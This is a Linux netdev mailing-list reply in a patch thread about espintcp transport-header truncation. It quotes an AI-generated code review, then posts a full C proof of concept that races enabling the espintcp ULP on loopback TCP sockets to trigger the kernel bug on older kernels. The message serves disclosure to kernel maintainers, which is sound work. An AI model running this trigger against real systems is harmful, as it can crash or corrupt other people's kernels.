Received: from mail-pj1-f47.google.com (mail-pj1-f47.google.com [209.85.216.47])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E5F2B302163
	for <netdev@vger.kernel.org>; Sat, 19 Sep 2026 02:30:21 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.47
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789785023; cv=none; b=R0LkVdha+EqZ+m9fFcZZPgVNVdXqwegEjoNwVS42wsIyLlSXhzrAWrkiUOcLAOzMvOq07ZShVZ6kEBZC1yQp8FJ45XK8kZL/lewhVDWMxJs6o7y84yRKIZihSC7wsp4h6d1+CKZCvh5ZWl002Pm174FcJcjRiAKXZkeV7zx6lUM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789785023; c=relaxed/simple;
	bh=SX9H6HWni2I75GPKyFLS++CWBppOw4BjxgOBFYLmAO4=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=iDnDKNImwqgX7Sj5jDp5N2Zxt8VyjGW0RFAqPi2VJnfbo/LG2Zi8zm1A9aPI3HIceUQQMd7ZaYCcyTWclAq1I1OEyh8z5qRtE+OFv98mareUR2+j6acvku+xker/nxBf2kaNsCbmc8cP87YMtuUa9KMr97cSW1W0YnQPzK6vz44=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=aBnRFqNN; arc=none smtp.client-ip=209.85.216.47
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="aBnRFqNN"
Received: by mail-pj1-f47.google.com with SMTP id 98e67ed59e1d1-398b1e63c49so1824121a91.0
        for <netdev@vger.kernel.org>; Fri, 18 Sep 2026 19:30:21 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1789785021; x=1790389821; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:content-type:mime-version
         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=p5A/NxBh+HsrZwZkVwtx5AnbdeHU2JhAnaO4gVhlLAw=;
        b=aBnRFqNNIMdpGWEtDoeCS+x1UtcgdtcBk5WsuwlLyXb4qCkxYSW2KwaGt7OWHrUi98
         vAq7yMaIMyGruPnS8u3xwlQayWkZMqDuxK99EDt411zX/aJfr4wAlbudZw6KncN0oP/l
         pHQvB4A9b6WoRXP+/7V/PaXN2M7EnsxJwes88Y+NDo/GXcb5/ogJGwbEi7lgpsvT662G
         jZXuF0vOpm+tpWl2VuoIZcpffVeKi0moYqsH1tQ7/WYCrd2M9Jl5FLw7g6Kc+ytss6XZ
         9YxlTnmr1n+vXsDJhjatnVUmYgjd8Z1AjSV6FXrs+4WjnJRbIaTSwucMZ9ONR+NbfAHP
         n8sA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789785021; x=1790389821;
        h=in-reply-to:content-disposition:content-type:mime-version
         :references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=p5A/NxBh+HsrZwZkVwtx5AnbdeHU2JhAnaO4gVhlLAw=;
        b=OGxCuBy0KCvxqY52F+n/Gkd1bGHAQdIv8lTGRgT24pFrORNp0D6zsOne24QvWMDlXf
         BIdgUeAfYW7cUAbJosHeA5AQRz6RGCJDGyIW+MElHbUkEtUVkEkE2j4cTVyF6oLUhi73
         iuLJCZ73JJGMtz/jpvJIUNQxIVXafKPj+KVMioox3QMPFluIW8J+vNv8eduOW4e/lw0W
         5T/SkbaQgp20imvuoyLTHCK7ychNqz7yGsvWDdlgU9/zoMBxP0jaUv8Qodr7dxxCW2ek
         DeJ1PyH2Rqt57Lc4iNWX3nhlaKONmMrV931hN6Mq31XAIkbXXQAr9H364pNI3++DE+4Y
         svJg==
X-Forwarded-Encrypted: i=1; AKwUvByquzYCYGM7sZxjD4Ca8fK4XVwPhWZ2ow3Xt24y7n6w41dZABLIkM/L9Hv8aFVqZkZP+Arpmkc=@vger.kernel.org
X-Gm-Message-State: AFuF++m7X8tdVXZJ7ic0zbHbOMy46JA/HA23pAunOXQpXYmUxPI6Zue5
	RBddiVeKtzXgKGTvNPRgqW7jWVx3LfJiMeMSAxmOvZsktj0JH7jnQ5Klyu2hfg==
X-Gm-Gg: AYBFou2ZmjTpVHpwbT9kP14WA1STFcUzY4yrx7i+UkFYLkkkRNzhk3fl3bDSgAXhDbr
	xu/F75yDOT/5tg/UsJsmSr+uOx912dZTM9bjc5F7VjqHWsKIri4Z9V0XFfAXpyZUZryH2GdMP3T
	f6A+6loXmLSXKIcjjHa/F+GFqwWKc1EMzwP+KAB03qXxYAe3oAvVLrf+djh3b/yr7MsdvNproD0
	fKDDi2ybl7SMHG+zMPBmnG1RtAoEKkfV69Mpw0rMWSKNH2Up5TrUcVhgwrnsY3IyNk8Xpknh87Q
	H8RGtAbL377zeU+iHyCYS6ZfUugOl5s5cG5OixirHjLtMOL88ZDb2QZycNv9hfqNdrk0LnSET3R
	Ppq0/+1C8Y5rwDyZIAvxCGQ/4xxe/k4WzXXDWktV537nwxo9k60CIAqbQHV+cB8EzBHbljg63mM
	Bm1V5FVH7nPiSkQV7lTs/CvZduJkbuQ/PJSlv/ptUgg5Gr+jiRwiY3tzPb0+EXxWjH8s6dpaSWd
	o1vo5H8WFD2P7UvFJ/4RkdP1JgVQmi7
X-Received: by 2002:a17:90b:4a4b:b0:39d:e7c7:8044 with SMTP id 98e67ed59e1d1-39e36106e8dmr12930696a91.17.1789785021108;
        Fri, 18 Sep 2026 19:30:21 -0700 (PDT)
Received: from mail.google.com ([2606:4e80:130d:d19:4480:1739:66b9:fe2d])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-144d55bf991sm3029141c88.6.2026.09.18.19.30.19
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 18 Sep 2026 19:30:20 -0700 (PDT)
Date: Fri, 18 Sep 2026 19:30:18 -0700
From: Wyatt Feng <wf.kernel.dev@gmail.com>
To: Steffen Klassert <steffen.klassert@secunet.com>
Cc: Jakub Kicinski <kuba@kernel.org>, davem@davemloft.net, 
	herbert@gondor.apana.org.au, netdev@vger.kernel.org
Subject: Re: [PATCH 12/12] net: xfrm: reject unrepresentable espintcp
 transport headers
Message-ID: <aq3w_Lv1pUP80ujM@mail.google.com>
References: <20260907093020.2228346-13-steffen.klassert@secunet.com>
 <20260908224902.1591378-1-kuba@kernel.org>
 <aqfK5ap1hORomJmY@secunet.com>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <aqfK5ap1hORomJmY@secunet.com>

On Mon, Sep 14, 2026 at 12:22:29PM -0800, Steffen Klassert wrote:
> Ccing Author of the patch.
> 
> On Tue, Sep 08, 2026 at 03:49:02PM -0700, Jakub Kicinski wrote:
> > This is an AI-generated review of your patch. The human sending this
> > email has considered the AI review valid, or at least plausible.
> > ---
> > net: xfrm: reject unrepresentable espintcp transport headers
> > 
> > handle_esp() in net/xfrm/espintcp.c switches from the plain transport
> > header reset to skb_reset_transport_header_careful(), and drops the skb
> > with LINUX_MIB_XFRMINERROR when the offset does not fit in
> > skb->transport_header.
> > 
> > > diff --git a/net/xfrm/espintcp.c b/net/xfrm/espintcp.c
> > > index 674aedc5af5a2..3e72b9f067b9b 100644
> > > --- a/net/xfrm/espintcp.c
> > > +++ b/net/xfrm/espintcp.c
> > > @@ -30,7 +30,11 @@ static void handle_esp(struct sk_buff *skb, struct sock *sk)
> > >  {
> > >  	struct tcp_skb_cb *tcp_cb = (struct tcp_skb_cb *)skb->cb;
> > >  
> > > -	skb_reset_transport_header(skb);
> > > +	if (!skb_reset_transport_header_careful(skb)) {
> > > +		XFRM_INC_STATS(sock_net(sk), LINUX_MIB_XFRMINERROR);
> > > +		kfree_skb(skb);
> > > +		return;
> > > +	}
> > 
> > [Severity: High]
> > Is this gate placed early enough to cover the pulls that the ESP input
> > path performs on the same skb afterwards?
> > 
> > skb_reset_transport_header_careful() in include/linux/skbuff.h only
> > rejects offsets that are already unrepresentable:
> > 
> > 	long offset = skb->data - skb->head;
> > 
> > 	if (unlikely(offset != (typeof(skb->transport_header))offset))
> > 		return false;
> > 
> > 	if (unlikely(offset == (typeof(skb->transport_header))~0U))
> > 		return false;
> > 
> > so any offset up to 65534 is accepted here with no margin left.
> > 
> > handle_esp() then calls xfrm4_rcv_encap()/xfrm6_rcv_encap(), and the
> > chain xfrm_input() -> esp_input() -> esp_input_done2() pulls the ESP
> > header and IV off the very same skb and resets the transport header with
> > the unhardened helpers, in net/ipv4/esp4.c:
> > 
> > 	skb_pull_rcsum(skb, hlen);
> > 	if (x->props.mode == XFRM_MODE_TUNNEL ||
> > 	    x->props.mode == XFRM_MODE_IPTFS)
> > 		skb_reset_transport_header(skb);
> > 	else
> > 		skb_set_transport_header(skb, -ihl);
> > 
> > with hlen = sizeof(struct ip_esp_hdr) + crypto_aead_ivsize(aead).
> > esp6_input_done2() in net/ipv6/esp6.c has the same shape for the
> > AF_INET6 branch of handle_esp().
> > 
> > For an skb whose head offset lands in the window [65536 - hlen, 65534],
> > the new check passes but the offset after skb_pull_rcsum() no longer
> > fits, so doesn't the truncation the changelog wants to eliminate simply
> > move downstream, now on a partially decrypted packet instead of a clean
> > drop?
> > 
> > Can such near-limit offsets be reached in practice?  espintcp_rcv() does:
> > 
> > 	/* remove header, leave non-ESP marker/SPI */
> > 	if (!pskb_pull(skb, rxm->offset + 2)) {
> > 
> > which makes skb->data - skb->head equal to the initial payload offset
> > plus rxm->offset + 2, and rxm->offset is bounded only by the size of one
> > coalesced TCP receive-queue skb.  If offsets at or above 65535 are
> > reachable (which is the premise of this patch), offsets a few bytes below
> > 65536 look equally reachable, and the peer selects them at byte
> > granularity through the 16-bit espintcp length prefix.
> > 
> > For ESP transport mode there also seems to be a second-order effect.  With
> > k = (offset + hlen) - 65536 and k >= ihl, esp_input_done2() leaves
> > transport_header at (k - ihl), i.e. wrapped, and
> > xfrm4_transport_input()/xfrm6_transport_input() in net/xfrm/xfrm_input.c
> > consume it directly:
> > 
> > 	int ihl = skb->data - skb_transport_header(skb);
> > 
> > 	if (skb->transport_header != skb->network_header) {
> > 		memmove(skb_transport_header(skb),
> > 			skb_network_header(skb), ihl);
> > 		...
> > 	skb_reset_transport_header(skb);
> > 
> > Can ihl here become roughly 64 KiB and turn that memmove() into a copy
> > that runs past the packet data into the trailing skb_shared_info?  With
> > AES-CBC (ivsize 16, hlen 24) k can be 20..23, which is >= a 20-byte ihl.
> > 
> > Would it make sense either to give the espintcp check a margin covering
> > the largest downstream ESP header plus IV pull (or avoid the large linear
> > pull in espintcp_rcv() altogether), or to convert the esp4/esp6 and
> > xfrm_input transport-mode reset sites to the careful helpers as well?
> > 
> > Conversely, if offsets in that window cannot occur, what makes the check
> > added here reachable at all?
> 
> The patch did not add a regression, but the question if that
> can be triggered at all is valid.
> 
> Wyatt can you explain how you tiggered this bug?

Yes, I have a PoC here as follows. This PoC can trigger the bug on
kernels prior to commit 96f01b53c2d. To run the PoC, compile it first:

  gcc -pthread -o poc poc.c

and then run the poc binary.

Let me know if you have further questions!

------BEGIN PoC------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#define DEFAULT_WORKERS 8
#define DEFAULT_ATTEMPTS 20000
#define FILL_TARGET (8U << 20)

struct pair {
	int client_fd;
	int server_fd;
	atomic_int start;
	atomic_int stop;
};

struct worker_arg {
	int id;
	int attempts;
};

static int cpu_count(void)
{
	long n = sysconf(_SC_NPROCESSORS_ONLN);

	return n > 0 ? (int)n : 1;
}

static void pin_current(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
}

static int set_nonblock(int fd)
{
	int flags = fcntl(fd, F_GETFL, 0);

	if (flags < 0)
		return -1;
	return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

static void tune_socket(int fd)
{
	int one = 1;
	int buf = 1 << 20;

	setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
	setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
	setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &buf, sizeof(buf));
}

static void close_pair(struct pair *p)
{
	if (p->client_fd >= 0)
		close(p->client_fd);
	if (p->server_fd >= 0)
		close(p->server_fd);
}

static int open_listener(uint16_t *port)
{
	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	socklen_t len = sizeof(addr);
	int one = 1;
	int fd = socket(AF_INET, SOCK_STREAM, 0);

	if (fd < 0)
		return -1;
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		goto fail;
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		goto fail;
	if (listen(fd, 128) < 0)
		goto fail;
	if (getsockname(fd, (struct sockaddr *)&addr, &len) < 0)
		goto fail;

	*port = ntohs(addr.sin_port);
	return fd;

fail:
	close(fd);
	return -1;
}

static int make_pair(int listen_fd, uint16_t port, struct pair *p)
{
	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
		.sin_port = htons(port),
	};
	socklen_t len = sizeof(addr);

	memset(p, 0, sizeof(*p));
	p->client_fd = -1;
	p->server_fd = -1;
	atomic_init(&p->start, 0);
	atomic_init(&p->stop, 0);

	p->client_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (p->client_fd < 0)
		return -1;

	tune_socket(p->client_fd);
	if (connect(p->client_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		goto fail;

	p->server_fd = accept(listen_fd, (struct sockaddr *)&addr, &len);
	if (p->server_fd < 0)
		goto fail;

	tune_socket(p->server_fd);
	if (set_nonblock(p->client_fd) < 0 || set_nonblock(p->server_fd) < 0)
		goto fail;

	return 0;

fail:
	close_pair(p);
	return -1;
}

static void prefill_client(int fd)
{
	char buf[4096];
	size_t total = 0;

	memset(buf, 'A', sizeof(buf));
	while (total < FILL_TARGET) {
		ssize_t n = send(fd, buf, sizeof(buf), MSG_DONTWAIT | MSG_NOSIGNAL);

		if (n > 0) {
			total += (size_t)n;
			continue;
		}
		if (n < 0 && errno == EINTR)
			continue;
		if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
			return;
		return;
	}
}

static void *server_reader(void *arg)
{
	struct pair *p = arg;
	char buf[1 << 15];

	if (cpu_count() > 1)
		pin_current(1);

	while (!atomic_load_explicit(&p->start, memory_order_acquire))
		;

	while (!atomic_load_explicit(&p->stop, memory_order_relaxed)) {
		ssize_t n = recv(p->server_fd, buf, sizeof(buf), MSG_DONTWAIT);

		if (n > 0)
			continue;
		if (n == 0)
			break;
		if (n < 0 && errno == EINTR)
			continue;
		if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
			sched_yield();
			continue;
		}
		break;
	}

	return NULL;
}

static void *server_writer(void *arg)
{
	struct pair *p = arg;
	char buf[64];

	memset(buf, 'B', sizeof(buf));
	if (cpu_count() > 1)
		pin_current(1);

	while (!atomic_load_explicit(&p->start, memory_order_acquire))
		;

	while (!atomic_load_explicit(&p->stop, memory_order_relaxed)) {
		ssize_t n = send(p->server_fd, buf, sizeof(buf),
				 MSG_DONTWAIT | MSG_NOSIGNAL);

		if (n >= 0)
			continue;
		if (errno == EINTR)
			continue;
		if (errno == EAGAIN || errno == EWOULDBLOCK) {
			sched_yield();
			continue;
		}
		break;
	}

	return NULL;
}

static void *worker(void *arg)
{
	struct worker_arg *w = arg;
	const char ulp[] = "espintcp";
	uint16_t port;
	int listen_fd;

	if (cpu_count() > 0)
		pin_current(w->id % cpu_count());

	listen_fd = open_listener(&port);
	if (listen_fd < 0)
		return NULL;

	for (int i = 0; i < w->attempts; i++) {
		struct pair p;
		pthread_t reader;
		pthread_t writer;

		if (make_pair(listen_fd, port, &p) < 0)
			continue;

		prefill_client(p.client_fd);
		if (pthread_create(&reader, NULL, server_reader, &p) != 0) {
			close_pair(&p);
			continue;
		}
		if (pthread_create(&writer, NULL, server_writer, &p) != 0) {
			atomic_store(&p.stop, 1);
			pthread_join(reader, NULL);
			close_pair(&p);
			continue;
		}

		atomic_store_explicit(&p.start, 1, memory_order_release);
		setsockopt(p.client_fd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp) - 1);
		atomic_store(&p.stop, 1);

		pthread_join(writer, NULL);
		pthread_join(reader, NULL);
		shutdown(p.client_fd, SHUT_RDWR);
		shutdown(p.server_fd, SHUT_RDWR);
		close_pair(&p);
	}

	close(listen_fd);
	return NULL;
}

int main(int argc, char **argv)
{
	int workers = argc > 1 ? atoi(argv[1]) : DEFAULT_WORKERS;
	int attempts = argc > 2 ? atoi(argv[2]) : DEFAULT_ATTEMPTS;
	pthread_t *threads;
	struct worker_arg *args;

	if (workers < 1)
		workers = 1;
	if (attempts < 1)
		attempts = 1;

	signal(SIGPIPE, SIG_IGN);

	threads = calloc((size_t)workers, sizeof(*threads));
	args = calloc((size_t)workers, sizeof(*args));
	if (!threads || !args)
		return 1;

	fprintf(stderr, "espintcp race: workers=%d attempts=%d\n",
		workers, attempts);

	for (int i = 0; i < workers; i++) {
		args[i].id = i;
		args[i].attempts = attempts;
		if (pthread_create(&threads[i], NULL, worker, &args[i]) != 0)
			return 1;
	}

	for (int i = 0; i < workers; i++)
		pthread_join(threads[i], NULL);

	return 0;
}


------END PoC--------
